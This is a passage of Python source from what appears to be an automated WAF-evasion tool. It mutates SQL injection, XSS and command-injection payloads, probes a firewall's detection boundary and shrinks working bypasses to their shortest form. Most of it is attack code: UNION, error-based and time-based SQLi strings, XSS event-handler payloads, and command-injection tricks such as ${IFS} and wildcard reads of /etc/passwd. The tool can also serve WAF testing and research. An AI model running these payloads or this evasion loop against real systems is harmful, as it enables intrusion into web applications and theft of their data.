                lambda p: p.replace("AND", "/*!50000AND*/"),
                lambda p: p.replace(" ", "/**/") if " " in p else p + "/**/",
            ]

        # Case variation family: mix upper/lower case in keywords
        elif "case" in fam or (payload != payload.lower() and payload != payload.upper()):
            strategies = [
                lambda p: p.replace("UNION", "UnIoN"),
                lambda p: p.replace("SELECT", "sElEcT"),
                lambda p: p.replace("AND", "AnD"),
                lambda p: p.replace("OR", "oR"),
                lambda p: p.replace("FROM", "fRoM"),
                lambda p: p.replace("WHERE", "wHeRe"),
                lambda p: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
                lambda p: p.replace("UNION", "UniOn"),
                lambda p: p.replace("SELECT", "SELeCT"),
            ]

        # Encoding family: vary encoding type and layers
        elif "encod" in fam or "%2" in payload or "0x" in payload:
            strategies = [
                lambda p: p.replace("'", "%27"),
                lambda p: p.replace("'", "0x27"),
                lambda p: p.replace("'", "%2527"),
                lambda p: "".join(f"%{ord(c):02x}" for c in p),
                lambda p: p.replace(" ", "%09"),
                lambda p: p.replace(" ", "%0a"),
                lambda p: p.replace(" ", "%0d%0a"),
                lambda p: p.replace(" ", "%2520"),
                lambda p: p.replace("UNION", "%55%4E%49%4F%4E"),
                lambda p: p.replace("SELECT", "%53%45%4C%45%43%54"),
            ]

        # Whitespace injection family
        elif "whitespace" in fam or "newline" in fam or "%0a" in payload or "%09" in payload:
            strategies = [
                lambda p: p.replace(" ", "%09"),
                lambda p: p.replace(" ", "%0a"),
                lambda p: p.replace(" ", "%0d"),
                lambda p: p.replace(" ", "%0b"),
                lambda p: p.replace(" ", "%0c"),
                lambda p: p.replace(" ", "%a0"),
                lambda p: p.replace(" ", "%0d%0a"),
                lambda p: p.replace(" ", "\t"),
                lambda p: p.replace(" ", "\n"),
            ]

        # Unicode/overlong family
        elif "unicode" in fam or "overlong" in fam:
            strategies = [
                lambda p: p.replace("'", "%ef%bc%87"),
                lambda p: p.replace("'", "%c0%a7"),
                lambda p: p.replace("'", "%c1%ab"),
                lambda p: p.replace(" ", "%e3%80%80"),
                lambda p: p.replace("UNION", "%ef%55%4e%49%4f%4e"),
                lambda p: p.replace("'", "\uff07"),
                lambda p: p.replace(" ", "\u3000"),
            ]

        # Parenthesis family
        elif "paren" in fam or "(" in payload:
            strategies = [
                lambda p: f"({p})",
                lambda p: p.replace("OR", "OR(").replace("=", ")=(") if "OR" in p else p,
                lambda p: p.replace("AND", "AND(").replace("=", ")=(") if "AND" in p else p,
                lambda p: p.replace(" ", ")(*)("),
                lambda p: f"(({p}))",
            ]

        # Inline comment (MySQL specific)
        elif "inline" in fam or "/*!" in payload:
            strategies = [
                lambda p: p.replace("SELECT", f"/*!{random.randint(10000,99999)}SELECT*/"),
                lambda p: p.replace("UNION", f"/*!{random.randint(10000,99999)}UNION*/"),
                lambda p: p.replace("AND", f"/*!{random.randint(10000,99999)}AND*/"),
                lambda p: p.replace(" ", f"/*!{random.randint(10000,99999)}*/"),
                lambda p: p + f"/*!{random.randint(10000,99999)}*/",
            ]

        # HPP (HTTP Parameter Pollution) family
        elif "hpp" in fam or "pollution" in fam:
            strategies = [
                lambda p: p + "&id=1",
                lambda p: "id=1&" + p,
                lambda p: p + "%26id%3d1",
                lambda p: p + "&" + p,
            ]

        # Semantic equivalent transforms
        if family in ("semantic", "semantic_evasion") or "semantic" in family:
            variants = SemanticTransformer.generate_semantic_variants(payload, self.vuln_type)
            if variants:
                return random.choice(variants)["payload"]

        # If no specific family match, fall back to generic SQLi mutation
        if not strategies:
            return self._mutate(payload, rate)

        return self._apply_random_strategy(payload, strategies, rate)

    def _infer_family_from_payload(self, payload: str) -> str:
        """Infer bypass family from payload content when family metadata is missing."""
        pl = payload.lower()
        if "/**/" in payload or "/*!" in payload:
            return "comment_injection"
        if "%27" in payload or "%25" in payload or "0x27" in payload:
            return "encoding"
        if "%09" in payload or "%0a" in payload or "%0d" in payload or "%a0" in payload:
            return "whitespace"
        if payload != payload.lower() and payload != payload.upper():
            if any(kw in pl for kw in ["select", "union", "and ", "or "]):
                return "case_variation"
        if "%ef%bc%87" in payload or "%c0%a7" in payload:
            return "unicode"
        return ""

    def _mutate_sqli(self, payload: str, rate: float) -> str:
        """SQLi-specific mutations — diversified to avoid BENCHMARK/SLEEP local optima."""
        strategies = [
            # Space bypass
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace(" ", "%0a"),
            lambda p: p.replace(" ", "%0d%0a"),
            lambda p: p.replace(" ", "+"),
            # Keyword splitting
            lambda p: p.replace("UNION", "UN/**/ION"),
            lambda p: p.replace("SELECT", "SEL/**/ECT"),
            lambda p: p.replace("WHERE", "WH/**/ERE"),
            lambda p: p.replace("FROM", "FR/**/OM"),
            lambda p: p.replace("AND", "A/**/ND"),
            lambda p: p.replace("OR", "O/**/R"),
            # Case variation
            lambda p: p.replace("UNION", "UnIoN"),
            lambda p: p.replace("SELECT", "sElEcT"),
            lambda p: p.replace("OR", random.choice(["Or", "oR"])),
            # Encoding
            lambda p: p.replace("'", "0x27"),
            lambda p: p.replace("'", "%27"),
            lambda p: p.replace('"', "%22"),
            lambda p: "".join(f"%{ord(c):02x}" for c in p),
            # Comment injection
            lambda p: p + random.choice(["--", "#", "/*"]),
            lambda p: p.replace("--", "--+"),
            # Operator variation
            lambda p: p.replace("=", " LIKE "),
            lambda p: p.replace("1=1", "1 LIKE 1"),
            lambda p: p.replace("=", "<>"),
            lambda p: p.replace("1=1", "1<>0"),
            # Time-based variation — AVOID BENCHMARK repetition, use diverse time functions
            lambda p: p.replace("SLEEP(3)", f"SLEEP({random.randint(1, 8)})"),
            lambda p: p.replace("SLEEP", random.choice(["PG_SLEEP", "WAITFOR DELAY '0:0:3'", "DBMS_PIPE.RECEIVE_MESSAGE"])) if "SLEEP" in p and random.random() < 0.3 else p,
            # Error-based — diverse functions, not just time-based
            lambda p: p + random.choice([
                " AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                " AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                " AND EXP(~(SELECT * FROM(SELECT VERSION())a))--",
                " AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))a FROM INFORMATION_SCHEMA.TABLES GROUP BY a)--",
            ]),
            # UNION variation
            lambda p: p + f" UNION SELECT {','.join(['NULL'] * random.randint(1, 5))}--",
            lambda p: p + f" UNION ALL SELECT {','.join(['1'] * random.randint(1, 3))}--",
            lambda p: p + f" UNION SELECT {','.join(['NULL'] * random.randint(3, 8))}--",
            # Parenthesis wrapping
            lambda p: f"({p})",
            lambda p: p.replace("OR", "OR(").replace("=", ")=(") if "OR" in p else p,
            # Double encoding
            lambda p: p.replace("'", "%2527"),
            lambda p: p.replace(" ", "%2520"),
            # Random junk
            lambda p: p + f"/*{random.randint(1000,9999)}*/",
            lambda p: f"/*{random.randint(1000,9999)}*/" + p,
            # Inline comment variations
            lambda p: p.replace("SELECT", "/*!50000SELECT*/"),
            lambda p: p.replace("UNION", "/*!50000UNION*/"),
        ]
        return self._apply_random_strategy(payload, strategies, rate)

    def _mutate_xss(self, payload: str, rate: float) -> str:
        """XSS-specific mutations."""
        strategies = [
            lambda p: p.replace("<script>", "<ScRiPt>"),
            lambda p: p.replace("alert", "\\x61lert"),
            lambda p: p.replace("alert(1)", f"alert({random.randint(1, 999)})"),
            lambda p: f"<img src=x onerror={self._extract_handler(p)}>",
            lambda p: f"<svg onload={self._extract_handler(p)}>",
            lambda p: f"<details open ontoggle={self._extract_handler(p)}>",
            lambda p: p.replace("<", "%3C").replace(">", "%3E"),
            lambda p: "".join(f"&#{ord(c)};" for c in p),
            lambda p: p.replace("(", "`").replace(")", "`"),
        ]
        return self._apply_random_strategy(payload, strategies, rate)

    def _mutate_cmdi(self, payload: str, rate: float) -> str:
        """Command injection specific mutations."""
        strategies = [
            lambda p: p.replace(";", "\n"),
            lambda p: p.replace(" ", "$IFS"),
            lambda p: p.replace(" ", "${IFS}"),
            lambda p: p.replace("cat", random.choice(["tac", "nl", "head", "tail"])),
            lambda p: p.replace("/etc/passwd", "/e?c/p?sswd"),
            lambda p: p.replace("id", "$(id)"),
            lambda p: p.replace("id", "`id`"),
            lambda p: ";".join([p, "id"]),
            lambda p: f"$({p})",
        ]
        return self._apply_random_strategy(payload, strategies, rate)

    def _random_mutate(self, payload: str, rate: float = 0.15) -> str:
        """Generic point mutation."""
        chars = list(payload)
        for i in range(len(chars)):
            if random.random() < rate:
                op = random.choice(["swap", "insert", "delete"])
                if op == "swap":
                    chars[i] = random.choice("'/\\-*(){}[]|&;#")
                elif op == "insert":
                    chars[i] = random.choice("'/ **/ %09") + chars[i]
                elif op == "delete":
                    chars[i] = ""
        return "".join(chars)

    def _apply_random_strategy(self, payload: str, strategies: list, rate: float) -> str:
        """Apply one or more random mutation strategies."""
        # Apply 1-3 strategies based on rate
        n_mutations = 1 + int(rate * 4)
        result = payload
        for _ in range(random.randint(1, min(n_mutations, len(strategies)))):
            strategy = random.choice(strategies)
            try:
                mutated = strategy(result)
                if mutated and mutated != result:
                    result = mutated
            except Exception:
                continue
        return result

    def _extract_handler(self, payload: str) -> str:
        """Extract JS handler from XSS payload."""
        match = re.search(r"alert\(.+?\)", payload, re.IGNORECASE)
        if match:
            return match.group(0)
        return "alert(1)"


# ── Backward-compatible PayloadMutator (rule-based, used by MutatorAgent) ──


class PayloadMutator:
    """Deterministic mutation strategies (used alongside GA)."""

    SQLI_SPACE_BYPASS = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%09"),
        lambda p: p.replace(" ", "%0a"),
    ]

    SQLI_CASE_VARIATION = [
        lambda p: p.upper(),
        lambda p: p.lower(),
    ]

    SQLI_COMMENT_INJECTION = [
        lambda p: p.replace("UNION", "UN/**/ION"),
        lambda p: p.replace("SELECT", "SEL/**/ECT"),
    ]

    XSS_TAG_VARIATIONS = [
        lambda p: p.replace("<script>", "<ScRiPt>"),
        lambda p: p.replace("alert", "\\x61lert"),
        lambda p: f"<img src=x onerror={p}>",
        lambda p: f"<svg onload={p}>",
    ]

    @classmethod
    def mutate_sqli(cls, payload: str) -> list[str]:
        mutations = []
        for group in [cls.SQLI_SPACE_BYPASS, cls.SQLI_CASE_VARIATION, cls.SQLI_COMMENT_INJECTION]:
            for fn in group:
                try:
                    m = fn(payload)
                    if m != payload:
                        mutations.append(m)
                except Exception:
                    continue
        return mutations

    @classmethod
    def mutate_xss(cls, payload: str) -> list[str]:
        mutations = []
        for fn in cls.XSS_TAG_VARIATIONS:
            try:
                m = fn(payload)
                if m != payload:
                    mutations.append(m)
            except Exception:
                continue
        return mutations


# ── Semantic Equivalent Transforms ─────────────────────────────────────


class SemanticTransformer:
    """Generate semantically equivalent SQL variants that bypass keyword-based WAFs.

    Unlike simple encoding/comment tricks, these produce completely different SQL syntax
    that achieves the same result. Semantic analysis WAFs may still catch these,
    but keyword/regex WAFs cannot.
    """

    # UNION SELECT alternatives
    UNION_ALTERNATIVES = [
        # Standard
        lambda cols: f"UNION SELECT {cols}",
        # UNION ALL (sometimes bypasses UNION-only rules)
        lambda cols: f"UNION ALL SELECT {cols}",
        # Subquery in FROM (no UNION keyword)
        lambda cols: f"AND 1=0 UNION SELECT {cols}",
        # Using JOIN instead of UNION
        lambda cols: f"JOIN (SELECT {cols})t ON 1=1",
    ]

    # OR 1=1 alternatives (boolean bypass)
    OR_ALTERNATIVES = [
        "OR 1=1",
        "OR 2>1",
        "OR 'a'='a'",
        "OR 1 LIKE 1",
        "OR 1 BETWEEN 0 AND 2",
        "OR 1 IN (1)",
        "OR 1 REGEXP 1",
        "OR NOT 1=0",
        "|| 1=1",
        "OR 1<>0",
    ]

    # AND alternatives
    AND_ALTERNATIVES = [
        "AND 1=1",
        "AND 2>1",
        "&& 1=1",
        "AND 1 LIKE 1",
        "AND 1 IN (1)",
        "AND NOT 0",
    ]

    # String concatenation alternatives (for data extraction)
    CONCAT_ALTERNATIVES = {
        "mysql": ["CONCAT({a},{b})", "CONCAT_WS('',{a},{b})", "{a} || {b}"],
        "postgresql": ["{a} || {b}", "CONCAT({a},{b})"],
        "mssql": ["{a} + {b}", "CONCAT({a},{b})"],
        "oracle": ["{a} || {b}", "CONCAT({a},{b})"],
    }

    # Sleep/delay alternatives (for time-based blind)
    SLEEP_ALTERNATIVES = {
        "mysql": ["SLEEP({n})", "BENCHMARK({n}000000,SHA1('x'))", "DO SLEEP({n})"],
        "postgresql": ["PG_SLEEP({n})", "GENERATE_SERIES(1,{n}000000)"],
        "mssql": ["WAITFOR DELAY '0:0:{n}'", "WAITFOR TIME '0:0:{n}'"],
    }

    # Subquery wrapping (hides the actual query inside nested structure)
    @staticmethod
    def wrap_in_subquery(payload: str) -> str:
        """Wrap a SELECT in a subquery to change its syntactic structure."""
        if "SELECT" in payload.upper():
            return payload.replace("SELECT", "(SELECT", 1) + ")"
        return payload

    @staticmethod
    def replace_spaces(payload: str) -> list[str]:
        """Replace spaces with SQL-valid alternatives."""
        alternatives = []
        for replacement in ["/**/", "%09", "%0a", "%0d", "+", "%0b", "%0c"]:
            alternatives.append(payload.replace(" ", replacement))
        return alternatives

    @staticmethod
    def replace_quotes(payload: str, dbms: str = "mysql") -> list[str]:
        """Replace string quotes with alternatives."""
        alternatives = []
        if "'" in payload:
            # CHAR() function
            alternatives.append(payload.replace("'", "CHAR(39)"))
            # Hex
            alternatives.append(payload.replace("'", "0x27"))
            # No-quote techniques
            if dbms == "mysql":
                alternatives.append(payload.replace("'", ""))  # Remove quotes entirely (numeric context)
        return alternatives

    @staticmethod
    def transform_sqli(payload: str) -> list[str]:
        """Generate semantically equivalent SQL variants."""
        variants = []
        pl = payload
        
        # 1. UNION SELECT → subquery alternatives
        if "union" in pl.lower() and "select" in pl.lower():
            # UNION ALL (some WAFs only check UNION SELECT, not UNION ALL SELECT)
            variants.append(pl.replace("UNION SELECT", "UNION ALL SELECT").replace("union select", "union all select"))
            # Parenthesized UNION
            variants.append(pl.replace("UNION SELECT", "(SELECT").rstrip("-- -").rstrip("--") + ")")
        
        # 2. OR 1=1 → equivalent boolean expressions
        if "or 1=1" in pl.lower() or "or '1'='1'" in pl.lower():
            variants.append(re.sub(r"(?i)or\s+1\s*=\s*1", "OR 2>1", pl))
            variants.append(re.sub(r"(?i)or\s+1\s*=\s*1", "OR NOT 0", pl))
            variants.append(re.sub(r"(?i)or\s+1\s*=\s*1", "OR 1 LIKE 1", pl))
            variants.append(re.sub(r"(?i)or\s+1\s*=\s*1", "OR 1 REGEXP 1", pl))
            variants.append(re.sub(r"(?i)or\s+1\s*=\s*1", "OR 1 BETWEEN 0 AND 2", pl))
        
        # 3. AND 1=1 → equivalent conditions
        if "and 1=1" in pl.lower():
            variants.append(re.sub(r"(?i)and\s+1\s*=\s*1", "AND 2>1", pl))
            variants.append(re.sub(r"(?i)and\s+1\s*=\s*1", "AND NOT 0", pl))
            variants.append(re.sub(r"(?i)and\s+1\s*=\s*1", "AND 1 IN (1)", pl))
        
        # 4. SLEEP() → alternative time functions
        if "sleep(" in pl.lower():
            variants.append(re.sub(r"(?i)sleep\(\s*(\d+)\s*\)", r"BENCHMARK(10000000,SHA1('a'))", pl))
            variants.append(re.sub(r"(?i)sleep\(\s*(\d+)\s*\)", r"(SELECT SLEEP(\1) FROM DUAL)", pl))
        
        # 5. CONCAT() → alternative string building
        if "concat(" in pl.lower():
            variants.append(re.sub(r"(?i)concat\(([^)]+)\)", r"CONCAT_WS('',\1)", pl))
        
        # 6. Subquery wrapping (adds complexity that confuses parsers)
        if "select" in pl.lower() and "from" not in pl.lower():
            # Wrap SELECT in subquery
            variants.append(pl.replace("SELECT ", "(SELECT ").replace("-- -", ") -- -").replace("--+", ") --+"))
        
        # 7. CASE WHEN alternatives for boolean
        if "and " in pl.lower() and "=" in pl:
            # Replace AND x=y with AND (CASE WHEN x=y THEN 1 ELSE 0 END)
            variants.append(re.sub(
                r"(?i)(AND\s+)(\w+)\s*=\s*(\w+)",
                r"\1(CASE WHEN \2=\3 THEN 1 ELSE 0 END)=1",
                pl
            ))
        
        # 8. Comment style alternatives
        if "-- " in pl or "--+" in pl:
            variants.append(pl.replace("-- -", "#").replace("--+", "#").replace("-- ", "#"))
            variants.append(pl.replace("-- -", ";%00").replace("--+", ";%00"))
        
        return [v for v in variants if v != payload and v.strip()]
    
    @staticmethod
    def transform_xss(payload: str) -> list[str]:
        """Generate semantically equivalent XSS variants."""
        variants = []
        
        # 1. alert() → alternative JS functions
        if "alert(" in payload:
            variants.append(payload.replace("alert(", "confirm("))
            variants.append(payload.replace("alert(", "prompt("))
            variants.append(payload.replace("alert(1)", "throw 1"))
            variants.append(payload.replace("alert(1)", "console.log(1)"))
        
        # 2. <script> → alternative execution contexts
        if "<script>" in payload.lower():
            variants.append(payload.replace("<script>", "<script/x>"))
            variants.append(payload.replace("<script>", "<script\t>"))
            variants.append(re.sub(r"(?i)<script>(.+?)</script>", r"<img src=x onerror=\1>", payload))
            variants.append(re.sub(r"(?i)<script>(.+?)</script>", r"<svg onload=\1>", payload))
        
        # 3. Event handler alternatives
        if "onerror=" in payload.lower():
            variants.append(payload.replace("onerror=", "onload="))
            variants.append(payload.replace("onerror=", "onfocus="))
            variants.append(payload.replace("onerror=", "onmouseover="))
        
        return [v for v in variants if v != payload and v.strip()]
    
    @staticmethod
    def transform_cmdi(payload: str) -> list[str]:
        """Generate semantically equivalent command injection variants."""
        variants = []
        
        # 1. Command separator alternatives
        if ";" in payload:
            variants.append(payload.replace(";", "%0a"))  # newline
            variants.append(payload.replace(";", "&&"))
            variants.append(payload.replace(";", "||"))
            variants.append(payload.replace(";", "|"))
        
        # 2. Command alternatives
        if "id" in payload:
            variants.append(payload.replace("id", "whoami"))
            variants.append(payload.replace("id", "/usr/bin/id"))
        if "cat " in payload:
            variants.append(payload.replace("cat ", "head "))
            variants.append(payload.replace("cat ", "tail "))
            variants.append(payload.replace("cat ", "less "))
        
        # 3. Quoting tricks
        if " " in payload:
            variants.append(payload.replace(" ", "${IFS}"))
            variants.append(payload.replace(" ", "$IFS$9"))
        
        return [v for v in variants if v != payload and v.strip()]

    @classmethod
    def generate_semantic_variants(cls, payload: str, vuln_type: str = "sqli", dbms: str = "mysql", count: int = 5) -> list[dict]:
        """Generate semantically equivalent variants of a payload.

        Returns list of {"payload": str, "technique": str, "reasoning": str}
        """
        variants = []
        payload_upper = payload.upper()

        if vuln_type == "sqli":
            # Replace OR 1=1 with alternatives
            for alt in cls.OR_ALTERNATIVES:
                if "OR 1=1" in payload_upper or "OR '1'='1'" in payload_upper:
                    new = re.sub(r"OR\s+['\"]?1['\"]?\s*=\s*['\"]?1['\"]?", alt, payload, flags=re.IGNORECASE)
                    if new != payload:
                        variants.append({"payload": new, "technique": "semantic_or_replace", "reasoning": f"Replaced OR with: {alt}"})

            # Replace AND with alternatives
            for alt in cls.AND_ALTERNATIVES[:3]:
                if "AND 1=1" in payload_upper:
                    new = payload.upper().replace("AND 1=1", alt)
                    if new != payload:
                        variants.append({"payload": new, "technique": "semantic_and_replace", "reasoning": f"Replaced AND with: {alt}"})

            # Space replacement
            space_variants = cls.replace_spaces(payload)
            for sv in space_variants[:3]:
                variants.append({"payload": sv, "technique": "semantic_space_replace", "reasoning": "SQL-valid space alternative"})

            # Quote replacement
            quote_variants = cls.replace_quotes(payload, dbms)
            for qv in quote_variants[:2]:
                variants.append({"payload": qv, "technique": "semantic_quote_replace", "reasoning": "Quote-free alternative"})

            # Subquery wrapping
            wrapped = cls.wrap_in_subquery(payload)
            if wrapped != payload:
                variants.append({"payload": wrapped, "technique": "semantic_subquery_wrap", "reasoning": "Nested subquery structure"})

        return variants[:count]


# ── Boundary Probing ───────────────────────────────────────────────────


class BoundaryProber:
    """Find the WAF's detection boundary — the minimal change that triggers blocking.

    Given a payload that passes, systematically add characters/keywords until it's blocked.
    Given a payload that's blocked, systematically remove characters until it passes.
    The boundary point is the most valuable seed for GA evolution.
    """

    @staticmethod
    def find_minimal_trigger(blocked_payload: str, test_fn) -> dict:
        """Binary search for the minimal substring that triggers the WAF.

        Args:
            blocked_payload: A payload known to be blocked
            test_fn: Function that takes a payload string and returns True if blocked

        Returns:
            {"minimal_trigger": str, "length": int, "position": int}
        """
        # Binary search: find shortest prefix that triggers
        low, high = 1, len(blocked_payload)
        minimal = blocked_payload

        while low <= high:
            mid = (low + high) // 2
            fragment = blocked_payload[:mid]
            if test_fn(fragment):
                minimal = fragment
                high = mid - 1
            else:
                low = mid + 1

        return {
            "minimal_trigger": minimal,
            "length": len(minimal),
            "position": 0,
            "original_length": len(blocked_payload),
        }

    @staticmethod
    def find_boundary_variants(blocked_payload: str, passed_payloads: list[str] = None) -> list[str]:
        """Generate payloads at the boundary between blocked and passed.
        
        Strategy: take a blocked payload and make minimal changes that might
        push it just past the WAF's detection threshold.
        """
        variants = []
        pl = blocked_payload
        
        # 1. Remove one character at a time from suspicious positions
        suspicious_chars = ["'", '"', ";", "-", "#", "/", "*", "(", ")", "=", "<", ">"]
        for i, c in enumerate(pl):
            if c in suspicious_chars:
                # Remove this character
                variants.append(pl[:i] + pl[i+1:])
                # Replace with space
                variants.append(pl[:i] + " " + pl[i+1:])
                # Replace with encoded version
                variants.append(pl[:i] + f"%{ord(c):02x}" + pl[i+1:])
        
        # 2. Truncate from the end (find minimum length that triggers)
        for trim in range(1, min(len(pl) // 2, 20)):
            variants.append(pl[:-trim])
        
        # 3. Split keywords with minimal insertion
        keywords = ["UNION", "SELECT", "AND", "OR", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE"]
        for kw in keywords:
            if kw.lower() in pl.lower():
                pos = pl.lower().find(kw.lower())
                mid = pos + len(kw) // 2
                # Insert single space
                variants.append(pl[:mid] + " " + pl[mid:])
                # Insert null byte
                variants.append(pl[:mid] + "%00" + pl[mid:])
                # Insert tab
                variants.append(pl[:mid] + "%09" + pl[mid:])
        
        # 4. If we have passed payloads, interpolate between blocked and passed
        if passed_payloads:
            for passed in passed_payloads[:3]:
                # Take first half of blocked + second half of passed
                mid_b = len(pl) // 2
                mid_p = len(passed) // 2
                variants.append(pl[:mid_b] + passed[mid_p:])
                variants.append(passed[:mid_p] + pl[mid_b:])
        
        # Deduplicate and filter
        seen = set()
        unique = []
        for v in variants:
            if v and v != blocked_payload and v not in seen:
                seen.add(v)
                unique.append(v)
        
        return unique[:30]  # Cap at 30 variants

    @staticmethod
    def find_boundary_payloads(passed_payload: str, blocked_payload: str, test_fn, max_probes: int = 10) -> list[dict]:
        """Generate payloads at the boundary between pass and block.

        These are the most valuable seeds for GA — they're almost blocked,
        meaning small mutations might push them over the edge.

        Returns list of {"payload": str, "distance_to_block": float}
        """
        from difflib import SequenceMatcher

        boundary_payloads = []

        # Strategy 1: Interpolate between passed and blocked
        # Find common prefix/suffix, vary the middle
        matcher = SequenceMatcher(None, passed_payload, blocked_payload)
        for tag, i1, i2, j1, j2 in matcher.get_opcodes():
            if tag == "replace" and j2 - j1 < 20:
                # Try the blocked version's segment in the passed payload's context
                hybrid = passed_payload[:i1] + blocked_payload[j1:j2] + passed_payload[i2:]
                if not test_fn(hybrid):
                    boundary_payloads.append({
                        "payload": hybrid,
                        "distance_to_block": 0.1,
                        "technique": "boundary_interpolation",
                    })

        # Strategy 2: Add one character at a time to passed payload
        trigger_chars = ["'", '"', " ", ";", "-", "/", "*", "(", ")", "="]
        for char in trigger_chars:
            probe = passed_payload + char
            if test_fn(probe):
                # Found a single-char trigger — the boundary is here
                boundary_payloads.append({
                    "payload": passed_payload,  # The passed version is the boundary
                    "distance_to_block": 0.05,
                    "trigger_char": char,
                    "technique": "boundary_single_char",
                })
                break

        return boundary_payloads[:max_probes]


# ── Payload Minimization ───────────────────────────────────────────────


class PayloadMinimizer:
    """Minimize a successful bypass payload to its shortest effective form.

    After finding a bypass, this removes unnecessary characters/segments
    while verifying the payload still bypasses the WAF and exploits the vuln.
    """

    @staticmethod
    def minimize_candidates(payload: str) -> list[str]:
        """Generate minimization candidates from a successful payload.
        
        These should be tested against the WAF — the shortest one that still
        passes is the minimized result.
        """
        candidates = []
        pl = payload
        
        # 1. Remove trailing/leading whitespace and comments
        stripped = pl.strip()
        if stripped.endswith("-- -"):
            candidates.append(stripped[:-4].strip())
        if stripped.endswith("--+"):
            candidates.append(stripped[:-3].strip())
        if stripped.endswith("--"):
            candidates.append(stripped[:-2].strip())
        if stripped.endswith("#"):
            candidates.append(stripped[:-1].strip())
        
        # 2. Remove redundant encoding (if double-encoded, try single)
        if "%25" in pl:
            candidates.append(pl.replace("%25", "%"))
        
        # 3. Remove redundant comments
        if "/**/" in pl:
            # Try removing some comments
            parts = pl.split("/**/")
            if len(parts) > 2:
                # Remove every other comment
                candidates.append("/**/".join(parts[::2]) + "/**/".join(parts[1::2]))
            # Try replacing all comments with single space
            candidates.append(pl.replace("/**/", " "))
        
        # 4. Simplify case variations (if mixed case, try all lower)
        has_mixed = any(c.isupper() for c in pl) and any(c.islower() for c in pl)
        if has_mixed:
            candidates.append(pl.lower())
            candidates.append(pl.upper())
        
        # 5. Remove redundant parentheses
        if "((" in pl:
            candidates.append(pl.replace("((", "(").replace("))", ")"))
        
        # 6. Shorten numeric values
        if "10000000" in pl:
            candidates.append(pl.replace("10000000", "1000000"))
        if "0x7e" in pl:
            candidates.append(pl.replace("0x7e", "0x23"))  # # instead of ~
        
        # 7. Progressive truncation from both ends
        for trim in [1, 2, 3, 5, 8]:
            if len(pl) > trim * 2 + 5:
                candidates.append(pl[trim:])
                candidates.append(pl[:-trim])
                candidates.append(pl[trim:-trim])
        
        # Deduplicate
        seen = set()
        unique = []
        for c in candidates:
            if c and c != payload and c not in seen and len(c) < len(payload):
                seen.add(c)
                unique.append(c)
        
        # Sort by length (shortest first)
        unique.sort(key=len)
        return unique[:20]

    @staticmethod
    def minimize(payload: str, test_fn, max_iterations: int = 20) -> dict:
        """Reduce payload to minimal form that still works.

        Args:
            payload: The successful payload to minimize
            test_fn: Function that returns True if payload still works (passes WAF + exploits)
            max_iterations: Max reduction attempts

        Returns:
            {"original": str, "minimized": str, "reduction": float, "steps": int}
        """
        current = payload
        steps = 0

        for _ in range(max_iterations):
            reduced = False

            # Strategy 1: Remove segments between delimiters
            # Try removing each space-separated token
            tokens = current.split(" ")
            if len(tokens) > 2:
                for i in range(len(tokens) - 1, 0, -1):
                    candidate = " ".join(tokens[:i] + tokens[i+1:])
                    if candidate and test_fn(candidate):
                        current = candidate
                        reduced = True
                        steps += 1
                        break

            # Strategy 2: Remove trailing characters
            if not reduced and len(current) > 5:
                for trim in range(1, min(5, len(current) // 4)):
                    candidate = current[:-trim]
                    if candidate and test_fn(candidate):
                        current = candidate
                        reduced = True
                        steps += 1
                        break

            # Strategy 3: Remove comments and whitespace padding
            if not reduced:
                # Remove /**/ comments
                candidate = re.sub(r'/\*.*?\*/', '', current)
                if candidate != current and candidate and test_fn(candidate):
                    current = candidate
                    reduced = True
                    steps += 1

                # Remove extra spaces
                if not reduced:
                    candidate = re.sub(r'\s+', ' ', current).strip()
                    if candidate != current and candidate and test_fn(candidate):
                        current = candidate
                        reduced = True
                        steps += 1

            if not reduced:
                break  # Can't reduce further

        original_len = len(payload)
        minimized_len = len(current)
        reduction = 1.0 - (minimized_len / max(original_len, 1))

        return {
            "original": payload,
            "minimized": current,
            "original_length": original_len,
            "minimized_length": minimized_len,
            "reduction": reduction,
            "steps": steps,
        }
